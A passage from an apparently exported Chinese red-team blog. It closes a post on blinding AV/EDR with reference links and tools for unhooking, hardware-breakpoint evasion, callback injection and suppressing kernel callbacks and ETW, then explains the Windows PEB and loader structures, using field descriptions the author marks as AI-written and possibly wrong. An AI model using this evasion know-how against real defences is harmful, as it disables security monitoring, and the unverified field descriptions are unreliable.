href=\"https://myzxcg.com/2023/10/AV/EDR-%E5%AE%8C%E5%85%A8%E8%87%B4%E7%9B%B2-%E6%B8%85%E9%99%A46%E5%A4%A7%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E5%AE%9E%E7%8E%B0/\">https://myzxcg.com/2023/10/AV/EDR-%E5%AE%8C%E5%85%A8%E8%87%B4%E7%9B%B2-%E6%B8%85%E9%99%A46%E5%A4%A7%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E5%AE%9E%E7%8E%B0/</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>hook杂谈：</p>\n<ul>\n<li><p><a href=\"https://www.covertswarm.com/post/timeline-of-edr-bypass-techniques\">https://www.covertswarm.com/post/timeline-of-edr-bypass-techniques</a></p>\n</li>\n<li><p><a href=\"https://drunkmars.top/2022/04/07/hook%E6%94%BB%E9%98%B2/\">浅谈hook攻防</a></p>\n</li>\n<li><p><a href=\"https://makosecblog.com/malware-dev/detecting-dll-unhooking/\">https://makosecblog.com/malware-dev/detecting-dll-unhooking/</a></p>\n</li>\n</ul>\n<p>unhook：</p>\n<ul>\n<li><p><a href=\"https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/\">https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/</a></p>\n</li>\n<li><p><a href=\"https://killer.wtf/2022/01/19/CustomJmpUnhook.html\">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></p>\n</li>\n<li><p><a href=\"https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes\">https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes</a></p>\n</li>\n</ul>\n<p>断点：</p>\n<ul>\n<li><p><a href=\"https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/\">https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/</a></p>\n</li>\n<li><p><a href=\"https://github.com/CymulateResearch/Blindside\">https://github.com/CymulateResearch/Blindside</a></p>\n</li>\n<li><p><a href=\"https://mp.weixin.qq.com/s/-f42qEY0EXreTS612jDi5Q\">利用硬件断点来Unhook BitDefender</a></p>\n</li>\n<li><p><a href=\"https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html\">https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html</a></p>\n</li>\n<li><p><a href=\"https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack\">https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack</a></p>\n</li>\n</ul>\n<p>Avrf回调：</p>\n<ul>\n<li><p><a href=\"https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html\">https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html</a></p>\n</li>\n<li><p><a href=\"https://github.com/MalwareTech/EDR-Preloader\">https://github.com/MalwareTech/EDR-Preloader</a></p>\n</li>\n<li><p><a href=\"https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/\">https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/</a></p>\n</li>\n</ul>\n<p>tools：</p>\n<ul>\n<li><a href=\"https://github.com/Mr-Un1k0d3r/EDRs\">https://github.com/Mr-Un1k0d3r/EDRs</a> - 该仓库包含有关 EDR 的hook信息</li>\n<li><a href=\"https://github.com/jthuraisamy/TelemetrySourcerer\">https://github.com/jthuraisamy/TelemetrySourcerer</a><ul>\n<li>列举各种内核模式回调函数，并能够抑制它们</li>\n<li>检测进程内的内联用户模式钩子，并能够取消钩住它们</li>\n<li>列出 ETW 会话和提供程序，并突出显示可能需要禁用的相关会话和提供程序</li>\n</ul>\n</li>\n</ul>\n","categories":["Red-Team"]},{"title":"Windows PEB","url":"/2026/02/18/PEB/","content":"<!--more-->\n\n<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p>在Windows中关于进程、线程的数据结构有以下</p>\n<ul>\n<li>EPROCESS、KPROCESS、PEB</li>\n<li>ETHREAD、KTHREAD、TEB</li>\n</ul>\n<h2 id=\"EPROCESS\"><a href=\"#EPROCESS\" class=\"headerlink\" title=\"EPROCESS\"></a>EPROCESS</h2><p>在内核中即0环存在EPROCESS结构体，该结构用于存储有关进程的关键信息，例如进程的状态、进程的地址空间、进程的安全上下文以及它正在使用的其他资源。每个进程都有一个EPROCESS结构，windows通过一个链表将所有的EPROCESS串起来进行管理。修改此结构体需要驱动。</p>\n<h2 id=\"PEB\"><a href=\"#PEB\" class=\"headerlink\" title=\"PEB\"></a>PEB</h2><p>在用户模式中存在 进程环境块（Process Environment Block）是一种加载到每个进程中的内存结构，它存储了该进程范围内的全局信息。这些信息对于进程的整个生命周期都至关重要，例如进程加载了哪些动态链接库 (DLL)、完整的命令行参数、启动目录、可执行文件的内存基址、进程堆信息以及一些用于调试和系统兼容性的标志位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;0x7c8 bytes (sizeof)</span><br><span class=\"line\">struct _PEB</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    UCHAR InheritedAddressSpace;                                            &#x2F;&#x2F;0x0</span><br><span class=\"line\">    UCHAR ReadImageFileExecOptions;                                         &#x2F;&#x2F;0x1</span><br><span class=\"line\">    UCHAR BeingDebugged;                                                    &#x2F;&#x2F;0x2</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        UCHAR BitField;                                                     &#x2F;&#x2F;0x3</span><br><span class=\"line\">        struct</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR ImageUsesLargePages:1;                                    &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsProtectedProcess:1;                                     &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsImageDynamicallyRelocated:1;                            &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR SkipPatchingUser32Forwarders:1;                           &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsPackagedProcess:1;                                      &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsAppContainer:1;                                         &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsProtectedProcessLight:1;                                &#x2F;&#x2F;0x3</span><br><span class=\"line\">            UCHAR IsLongPathAwareProcess:1;                                 &#x2F;&#x2F;0x3</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR Padding0[4];                                                      &#x2F;&#x2F;0x4</span><br><span class=\"line\">    VOID* Mutant;                                                           &#x2F;&#x2F;0x8</span><br><span class=\"line\">    VOID* ImageBaseAddress;                                                 &#x2F;&#x2F;0x10</span><br><span class=\"line\">    struct _PEB_LDR_DATA* Ldr;                                              &#x2F;&#x2F;0x18</span><br><span class=\"line\">    struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;                 &#x2F;&#x2F;0x20</span><br><span class=\"line\">    VOID* SubSystemData;                                                    &#x2F;&#x2F;0x28</span><br><span class=\"line\">    VOID* ProcessHeap;                                                      &#x2F;&#x2F;0x30</span><br><span class=\"line\">    struct _RTL_CRITICAL_SECTION* FastPebLock;                              &#x2F;&#x2F;0x38</span><br><span class=\"line\">    union _SLIST_HEADER* volatile AtlThunkSListPtr;                         &#x2F;&#x2F;0x40</span><br><span class=\"line\">    VOID* IFEOKey;                                                          &#x2F;&#x2F;0x48</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG CrossProcessFlags;                                            &#x2F;&#x2F;0x50</span><br><span class=\"line\">        struct</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG ProcessInJob:1;                                           &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessInitializing:1;                                    &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessUsingVEH:1;                                        &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessUsingVCH:1;                                        &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessUsingFTH:1;                                        &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessPreviouslyThrottled:1;                             &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessCurrentlyThrottled:1;                              &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ProcessImagesHotPatched:1;                                &#x2F;&#x2F;0x50</span><br><span class=\"line\">            ULONG ReservedBits0:24;                                         &#x2F;&#x2F;0x50</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR Padding1[4];                                                      &#x2F;&#x2F;0x54</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        VOID* KernelCallbackTable;                                          &#x2F;&#x2F;0x58</span><br><span class=\"line\">        VOID* UserSharedInfoPtr;                                            &#x2F;&#x2F;0x58</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG SystemReserved;                                                   &#x2F;&#x2F;0x60</span><br><span class=\"line\">    ULONG AtlThunkSListPtr32;                                               &#x2F;&#x2F;0x64</span><br><span class=\"line\">    VOID* ApiSetMap;                                                        &#x2F;&#x2F;0x68</span><br><span class=\"line\">    ULONG TlsExpansionCounter;                                              &#x2F;&#x2F;0x70</span><br><span class=\"line\">    UCHAR Padding2[4];                                                      &#x2F;&#x2F;0x74</span><br><span class=\"line\">    VOID* TlsBitmap;                                                        &#x2F;&#x2F;0x78</span><br><span class=\"line\">    ULONG TlsBitmapBits[2];                                                 &#x2F;&#x2F;0x80</span><br><span class=\"line\">    VOID* ReadOnlySharedMemoryBase;                                         &#x2F;&#x2F;0x88</span><br><span class=\"line\">    VOID* SharedData;                                                       &#x2F;&#x2F;0x90</span><br><span class=\"line\">    VOID** ReadOnlyStaticServerData;                                        &#x2F;&#x2F;0x98</span><br><span class=\"line\">    VOID* AnsiCodePageData;                                                 &#x2F;&#x2F;0xa0</span><br><span class=\"line\">    VOID* OemCodePageData;                                                  &#x2F;&#x2F;0xa8</span><br><span class=\"line\">    VOID* UnicodeCaseTableData;                                             &#x2F;&#x2F;0xb0</span><br><span class=\"line\">    ULONG NumberOfProcessors;                                               &#x2F;&#x2F;0xb8</span><br><span class=\"line\">    ULONG NtGlobalFlag;                                                     &#x2F;&#x2F;0xbc</span><br><span class=\"line\">    union _LARGE_INTEGER CriticalSectionTimeout;                            &#x2F;&#x2F;0xc0</span><br><span class=\"line\">    ULONGLONG HeapSegmentReserve;                                           &#x2F;&#x2F;0xc8</span><br><span class=\"line\">    ULONGLONG HeapSegmentCommit;                                            &#x2F;&#x2F;0xd0</span><br><span class=\"line\">    ULONGLONG HeapDeCommitTotalFreeThreshold;                               &#x2F;&#x2F;0xd8</span><br><span class=\"line\">    ULONGLONG HeapDeCommitFreeBlockThreshold;                               &#x2F;&#x2F;0xe0</span><br><span class=\"line\">    ULONG NumberOfHeaps;                                                    &#x2F;&#x2F;0xe8</span><br><span class=\"line\">    ULONG MaximumNumberOfHeaps;                                             &#x2F;&#x2F;0xec</span><br><span class=\"line\">    VOID** ProcessHeaps;                                                    &#x2F;&#x2F;0xf0</span><br><span class=\"line\">    VOID* GdiSharedHandleTable;                                             &#x2F;&#x2F;0xf8</span><br><span class=\"line\">    VOID* ProcessStarterHelper;                                             &#x2F;&#x2F;0x100</span><br><span class=\"line\">    ULONG GdiDCAttributeList;                                               &#x2F;&#x2F;0x108</span><br><span class=\"line\">    UCHAR Padding3[4];                                                      &#x2F;&#x2F;0x10c</span><br><span class=\"line\">    struct _RTL_CRITICAL_SECTION* LoaderLock;                               &#x2F;&#x2F;0x110</span><br><span class=\"line\">    ULONG OSMajorVersion;                                                   &#x2F;&#x2F;0x118</span><br><span class=\"line\">    ULONG OSMinorVersion;                                                   &#x2F;&#x2F;0x11c</span><br><span class=\"line\">    USHORT OSBuildNumber;                                                   &#x2F;&#x2F;0x120</span><br><span class=\"line\">    USHORT OSCSDVersion;                                                    &#x2F;&#x2F;0x122</span><br><span class=\"line\">    ULONG OSPlatformId;                                                     &#x2F;&#x2F;0x124</span><br><span class=\"line\">    ULONG ImageSubsystem;                                                   &#x2F;&#x2F;0x128</span><br><span class=\"line\">    ULONG ImageSubsystemMajorVersion;                                       &#x2F;&#x2F;0x12c</span><br><span class=\"line\">    ULONG ImageSubsystemMinorVersion;                                       &#x2F;&#x2F;0x130</span><br><span class=\"line\">    UCHAR Padding4[4];                                                      &#x2F;&#x2F;0x134</span><br><span class=\"line\">    ULONGLONG ActiveProcessAffinityMask;                                    &#x2F;&#x2F;0x138</span><br><span class=\"line\">    ULONG GdiHandleBuffer[60];                                              &#x2F;&#x2F;0x140</span><br><span class=\"line\">    VOID (*PostProcessInitRoutine)();                                       &#x2F;&#x2F;0x230</span><br><span class=\"line\">    VOID* TlsExpansionBitmap;                                               &#x2F;&#x2F;0x238</span><br><span class=\"line\">    ULONG TlsExpansionBitmapBits[32];                                       &#x2F;&#x2F;0x240</span><br><span class=\"line\">    ULONG SessionId;                                                        &#x2F;&#x2F;0x2c0</span><br><span class=\"line\">    UCHAR Padding5[4];                                                      &#x2F;&#x2F;0x2c4</span><br><span class=\"line\">    union _ULARGE_INTEGER AppCompatFlags;                                   &#x2F;&#x2F;0x2c8</span><br><span class=\"line\">    union _ULARGE_INTEGER AppCompatFlagsUser;                               &#x2F;&#x2F;0x2d0</span><br><span class=\"line\">    VOID* pShimData;                                                        &#x2F;&#x2F;0x2d8</span><br><span class=\"line\">    VOID* AppCompatInfo;                                                    &#x2F;&#x2F;0x2e0</span><br><span class=\"line\">    struct _UNICODE_STRING CSDVersion;                                      &#x2F;&#x2F;0x2e8</span><br><span class=\"line\">    struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;                 &#x2F;&#x2F;0x2f8</span><br><span class=\"line\">    struct _ASSEMBLY_STORAGE_MAP* ProcessAssemblyStorageMap;                &#x2F;&#x2F;0x300</span><br><span class=\"line\">    struct _ACTIVATION_CONTEXT_DATA* SystemDefaultActivationContextData;    &#x2F;&#x2F;0x308</span><br><span class=\"line\">    struct _ASSEMBLY_STORAGE_MAP* SystemAssemblyStorageMap;                 &#x2F;&#x2F;0x310</span><br><span class=\"line\">    ULONGLONG MinimumStackCommit;                                           &#x2F;&#x2F;0x318</span><br><span class=\"line\">    VOID* SparePointers[4];                                                 &#x2F;&#x2F;0x320</span><br><span class=\"line\">    ULONG SpareUlongs[5];                                                   &#x2F;&#x2F;0x340</span><br><span class=\"line\">    VOID* WerRegistrationData;                                              &#x2F;&#x2F;0x358</span><br><span class=\"line\">    VOID* WerShipAssertPtr;                                                 &#x2F;&#x2F;0x360</span><br><span class=\"line\">    VOID* pUnused;                                                          &#x2F;&#x2F;0x368</span><br><span class=\"line\">    VOID* pImageHeaderHash;                                                 &#x2F;&#x2F;0x370</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG TracingFlags;                                                 &#x2F;&#x2F;0x378</span><br><span class=\"line\">        struct</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG HeapTracingEnabled:1;                                     &#x2F;&#x2F;0x378</span><br><span class=\"line\">            ULONG CritSecTracingEnabled:1;                                  &#x2F;&#x2F;0x378</span><br><span class=\"line\">            ULONG LibLoaderTracingEnabled:1;                                &#x2F;&#x2F;0x378</span><br><span class=\"line\">            ULONG SpareTracingBits:29;                                      &#x2F;&#x2F;0x378</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR Padding6[4];                                                      &#x2F;&#x2F;0x37c</span><br><span class=\"line\">    ULONGLONG CsrServerReadOnlySharedMemoryBase;                            &#x2F;&#x2F;0x380</span><br><span class=\"line\">    ULONGLONG TppWorkerpListLock;                                           &#x2F;&#x2F;0x388</span><br><span class=\"line\">    struct _LIST_ENTRY TppWorkerpList;                                      &#x2F;&#x2F;0x390</span><br><span class=\"line\">    VOID* WaitOnAddressHashTable[128];                                      &#x2F;&#x2F;0x3a0</span><br><span class=\"line\">    VOID* TelemetryCoverageHeader;                                          &#x2F;&#x2F;0x7a0</span><br><span class=\"line\">    ULONG CloudFileFlags;                                                   &#x2F;&#x2F;0x7a8</span><br><span class=\"line\">    ULONG CloudFileDiagFlags;                                               &#x2F;&#x2F;0x7ac</span><br><span class=\"line\">    CHAR PlaceholderCompatibilityMode;                                      &#x2F;&#x2F;0x7b0</span><br><span class=\"line\">    CHAR PlaceholderCompatibilityModeReserved[7];                           &#x2F;&#x2F;0x7b1</span><br><span class=\"line\">    struct _LEAP_SECOND_DATA* LeapSecondData;                               &#x2F;&#x2F;0x7b8</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG LeapSecondFlags;                                              &#x2F;&#x2F;0x7c0</span><br><span class=\"line\">        struct</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG SixtySecondEnabled:1;                                     &#x2F;&#x2F;0x7c0</span><br><span class=\"line\">            ULONG Reserved:31;                                              &#x2F;&#x2F;0x7c0</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG NtGlobalFlag2;                                                    &#x2F;&#x2F;0x7c4</span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p>AI描述PEB字段含义如下，未必正确</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x0 - 0x3: 基本状态标志</span><br><span class=\"line\">InheritedAddressSpace (0x0) - 是否继承父进程的地址空间</span><br><span class=\"line\">ReadImageFileExecOptions (0x1) - 是否读取可执行文件的特殊执行选项</span><br><span class=\"line\">BeingDebugged (0x2) - 进程是否正在被调试</span><br><span class=\"line\">BitField &#x2F; 位域 (0x3)</span><br><span class=\"line\">    ImageUsesLargePages - 是否使用大页内存映射</span><br><span class=\"line\">    IsProtectedProcess - 是否受保护进程(如防止注入)</span><br><span class=\"line\">    IsImageDynamicallyRelocated - 可执行映像是否被动态重定位</span><br><span class=\"line\">    SkipPatchingUser32Forwarders - 是否跳过 User32 转发修补</span><br><span class=\"line\">    IsPackagedProcess - 是否为打包应用(UWP&#x2F;Store 应用)</span><br><span class=\"line\">    IsAppContainer - 是否在 AppContainer 沙箱中运行</span><br><span class=\"line\">    IsProtectedProcessLight - 轻量保护进程标志</span><br><span class=\"line\">    IsLongPathAwareProcess - 是否支持长路径文件名</span><br><span class=\"line\"></span><br><span class=\"line\">0x8 - 0x30: 核心指针</span><br><span class=\"line\">Mutant (0x8) - 内核同步对象指针(用于进程互斥)</span><br><span class=\"line\">ImageBaseAddress (0x10) - 可执行映像加载基址</span><br><span class=\"line\">Ldr (0x18) - 指向 _PEB_LDR_DATA,记录加载的模块列表</span><br><span class=\"line\">ProcessParameters (0x20) - 指向 _RTL_USER_PROCESS_PARAMETERS,存储命令行、环境变量等</span><br><span class=\"line\">SubSystemData (0x28) - 子系统数据指针(如 GUI&#x2F;Console 子系统)</span><br><span class=\"line\">ProcessHeap (0x30) - 默认堆指针</span><br><span class=\"line\"></span><br><span class=\"line\">0x38 - 0x58: 同步和 Thunk 指针</span><br><span class=\"line\">FastPebLock (0x38) - PEB 快速锁,用于线程安全访问</span><br><span class=\"line\">AtlThunkSListPtr (0x40) - ATL 弹性链表指针,用于内部 thunk</span><br><span class=\"line\">IFEOKey (0x48) - Image File Execution Options 注册表键指针</span><br><span class=\"line\">CrossProcessFlags (0x50) - 进程状态标志集合(如 ProcessInJob、使用 VEH&#x2F;FTH 等)</span><br><span class=\"line\"></span><br><span class=\"line\">0x58 - 0x98: 内核回调与 API 重映射</span><br><span class=\"line\">KernelCallbackTable &#x2F; UserSharedInfoPtr (0x58) - 内核回调表或用户共享信息</span><br><span class=\"line\">SystemReserved (0x60) - 系统保留</span><br><span class=\"line\">AtlThunkSListPtr32 (0x64) - 32 位 ATL 弹性链表指针</span><br><span class=\"line\">ApiSetMap (0x68) - API 重映射表</span><br><span class=\"line\">TlsExpansionCounter (0x70) - TLS 扩展计数器</span><br><span class=\"line\">TlsBitmap (0x78) &amp; TlsBitmapBits (0x80) - TLS 使用情况位图</span><br><span class=\"line\">ReadOnlySharedMemoryBase (0x88) - 只读共享内存基址</span><br><span class=\"line\">SharedData (0x90) - KUSER_SHARED_DATA 全局共享数据指针</span><br><span class=\"line\">ReadOnlyStaticServerData (0x98) - 静态服务器只读数据</span><br><span class=\"line\"></span><br><span class=\"line\">0xa0 - 0xb8: 字符编码和 CPU 信息</span><br><span class=\"line\">AnsiCodePageData (0xa0) - ANSI 编码页数据表</span><br><span class=\"line\">OemCodePageData (0xa8) - OEM 编码页数据表</span><br><span class=\"line\">UnicodeCaseTableData (0xb0) - Unicode 大小写映射表</span><br><span class=\"line\">NumberOfProcessors (0xb8) - 系统 CPU 核心数量</span><br><span class=\"line\"></span><br><span class=\"line\">0xbc - 0xf0: 堆和同步超时</span><br><span class=\"line\">NtGlobalFlag (0xbc) - 内核调试标志</span><br><span class=\"line\">CriticalSectionTimeout (0xc0) - 临界区超时</span><br><span class=\"line\">HeapSegmentReserve (0xc8)、HeapSegmentCommit (0xd0) - 堆段保留与提交大小</span><br><span class=\"line\">HeapDeCommitTotalFreeThreshold (0xd8)、HeapDeCommitFreeBlockThreshold (0xe0) - 堆释放阈值</span><br><span class=\"line\">NumberOfHeaps (0xe8)、MaximumNumberOfHeaps (0xec) - 堆数量限制</span><br><span class=\"line\">ProcessHeaps (0xf0) - 所有进程堆数组</span><br><span class=\"line\"></span><br><span class=\"line\">0xf8 - 0x110: GDI 和 Loader</span><br><span class=\"line\">GdiSharedHandleTable (0xf8) - GDI 共享句柄表</span><br><span class=\"line\">ProcessStarterHelper (0x100) - 内核启动辅助指针</span><br><span class=\"line\">GdiDCAttributeList (0x108) - GDI 设备上下文属性列表</span><br><span class=\"line\">LoaderLock (0x110) - 模块加载锁</span><br><span class=\"line\"></span><br><span class=\"line\">0x118 - 0x134: OS 版本与子系统</span><br><span class=\"line\">OSMajorVersion&#x2F;OSMinorVersion&#x2F;OSBuildNumber&#x2F;OSCSDVersion - 操作系统版本信息</span><br><span class=\"line\">OSPlatformId - 平台 ID</span><br><span class=\"line\">ImageSubsystem&#x2F;ImageSubsystemMajorVersion&#x2F;ImageSubsystemMinorVersion - 可执行文件子系统类型和版本</span><br><span class=\"line\">ActiveProcessAffinityMask (0x138) - CPU 亲和掩码</span><br><span class=\"line\"></span><br><span class=\"line\">0x140 - 0x2c0: GDI 缓冲、初始化例程、TLS 扩展</span><br><span class=\"line\">GdiHandleBuffer (0x140) - GDI 本地句柄缓存</span><br><span class=\"line\">PostProcessInitRoutine (0x230) - 初始化后回调例程</span><br><span class=\"line\">TlsExpansionBitmap (0x238)、TlsExpansionBitmapBits (0x240) - TLS 扩展位图</span><br><span class=\"line\">SessionId (0x2c0) - Terminal Services &#x2F; Session ID</span><br><span class=\"line\"></span><br><span class=\"line\">0x2c8 - 0x310: 兼容性、激活上下文、程序集</span><br><span class=\"line\">AppCompatFlags&#x2F;AppCompatFlagsUser - 兼容性标志</span><br><span class=\"line\">pShimData&#x2F;AppCompatInfo - 应用兼容性数据指针</span><br><span class=\"line\">CSDVersion - 服务包 Unicode 字符串</span><br><span class=\"line\">ActivationContextData&#x2F;ProcessAssemblyStorageMap&#x2F;</span><br><span class=\"line\">SystemDefaultActivationContextData&#x2F;SystemAssemblyStorageMap - 激活上下文和程序集存储映射</span><br><span class=\"line\"></span><br><span class=\"line\">0x318 - 0x370: 堆栈与调试指针</span><br><span class=\"line\">MinimumStackCommit - 最小栈提交大小</span><br><span class=\"line\">SparePointers &#x2F; SpareUlongs - 保留指针和整数</span><br><span class=\"line\">WerRegistrationData &#x2F; WerShipAssertPtr - Windows 错误报告数据</span><br><span class=\"line\">pUnused &#x2F; pImageHeaderHash - 未使用或镜像哈希指针</span><br><span class=\"line\"></span><br><span class=\"line\">0x378 - 0x3a0: 追踪和任务池</span><br><span class=\"line\">TracingFlags - Heap&#x2F;CritSec&#x2F;Loader 追踪开关</span><br><span class=\"line\">CsrServerReadOnlySharedMemoryBase - CSR 服务器共享内存</span><br><span class=\"line\">TppWorkerpListLock &#x2F; TppWorkerpList - 线程池工作列表锁和列表</span><br><span class=\"line\">WaitOnAddressHashTable - 内核等待地址哈希表</span><br><span class=\"line\"></span><br><span class=\"line\">0x7a0 - 0x7c4: 云文件、占位兼容、闰秒</span><br><span class=\"line\">TelemetryCoverageHeader - 遥测覆盖头</span><br><span class=\"line\">CloudFileFlags &#x2F; CloudFileDiagFlags - 云文件标志</span><br><span class=\"line\">PlaceholderCompatibilityMode - 占位兼容模式</span><br><span class=\"line\">LeapSecondData &#x2F; LeapSecondFlags - 闰秒数据及启用标志</span><br><span class=\"line\">NtGlobalFlag2 - 第二组内核标志(调试、追踪等)</span><br></pre></td></tr></table></figure>\n\n<p>其中重要的是Ldr字段，该字段指向 <strong>PEB_LDR_DATA</strong> 结构</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">struct _PEB_LDR_DATA* Ldr;  &#x2F;&#x2F;0x18</span><br></pre></td></tr></table></figure>\n\n<p><strong>PEB_LDR_DATA</strong> 结构包含三个双向链表</p>\n<ul>\n<li>InLoadOrderModuleList - 加载顺序</li>\n<li>InMemoryOrderModuleList - 内存布局顺序</li>\n<li>InInitializationOrderModuleList - 初始化顺序</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;0x58 bytes (sizeof)</span><br><span class=\"line\">struct _PEB_LDR_DATA</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ULONG Length;                                          &#x2F;&#x2F;0x0</span><br><span class=\"line\">    UCHAR Initialized;                                     &#x2F;&#x2F;0x4</span><br><span class=\"line\">    VOID* SsHandle;                                        &#x2F;&#x2F;0x8</span><br><span class=\"line\">    struct _LIST_ENTRY InLoadOrderModuleList;              &#x2F;&#x2F;0x10</span><br><span class=\"line\">    struct _LIST_ENTRY InMemoryOrderModuleList;            &#x2F;&#x2F;0x20</span><br><span class=\"line\">    struct _LIST_ENTRY InInitializationOrderModuleList;    &#x2F;&#x2F;0x30</span><br><span class=\"line\">    VOID* EntryInProgress;                                 &#x2F;&#x2F;0x40</span><br><span class=\"line\">    UCHAR ShutdownInProgress;                              &#x2F;&#x2F;0x48</span><br><span class=\"line\">    VOID* ShutdownThreadId;                                &#x2F;&#x2F;0x50</span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p>每个双向链表中 <code>_LIST_ENTRY</code> 中的 <code>Flink/Blink</code> 指针，指向了一个 <strong>LDR_DATA_TABLE_ENTRY</strong> 结构体，该结构是描述加载模块的信息，例如DLL基址、DLL名称。每一个加载的模块（.dll）都有一个这样的结构体。该结构体中分别有三个<code>_LIST_ENTRY类型的InLoadOrderLinks、InMemoryOrderLinks、InInitializationOrderLinks </code> 它们又指向了下一个 LDR_DATA_TABLE_ENTRY 结构体</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;0x120 bytes (sizeof)</span><br><span class=\"line\">struct _LDR_DATA_TABLE_ENTRY</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct _LIST_ENTRY InLoadOrderLinks;                                    &#x2F;&#x2F;0x0</span><br><span class=\"line\">    struct _LIST_ENTRY InMemoryOrderLinks;                                  &#x2F;&#x2F;0x10</span><br><span class=\"line\">    struct _LIST_ENTRY InInitializationOrderLinks;                          &#x2F;&#x2F;0x20</span><br><span class=\"line\">    VOID* DllBase;                                                          &#x2F;&#x2F;0x30</span><br><span class=\"line\">    VOID* EntryPoint;                                                       &#x2F;&#x2F;0x38</span><br><span class=\"line\">    ULONG SizeOfImage;                                                      &#x2F;&#x2F;0x40</span><br><span class=\"line\">    struct _UNICODE_STRING FullDllName;                                     &#x2F;&#x2F;0x48</span><br><span class=\"line\">    struct _UNICODE_STRING BaseDllName;                                     &#x2F;&#x2F;0x58</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        UCHAR FlagGroup[4];                                                 &#x2F;&#x2F;0x68</span><br><span class=\"line\">        ULONG Flags;                                                        &#x2F;&#x2F;0x68</span><br><span class=\"line\">        struct</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    USHORT ObsoleteLoadCount;                                               &#x2F;&#x2F;0x6c</span><br><span class=\"line\">    USHORT TlsIndex;                                                        &#x2F;&#x2F;0x6e</span><br><span class=\"line\">    struct _LIST_ENTRY HashLinks;                                           &#x2F;&#x2F;0x70</span><br><span class=\"line\">    ULONG TimeDateStamp;                                                    &#x2F;&#x2F;0x80</span><br><span class=\"line\">    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;                &#x2F;&#x2F;0x88</span><br><span class=\"line\">    VOID* Lock;                                                             &#x2F;&#x2F;0x90</span><br><span class=\"line\">    struct _LDR_DDAG_NODE* DdagNode;                                        &#x2F;&#x2F;0x98</span><br><span class=\"line\">    struct _LIST_ENTRY NodeModuleLink;                                      &#x2F;&#x2F;0xa0</span><br><span class=\"line\">    struct _LDRP_LOAD_CONTEXT* LoadContext;                                 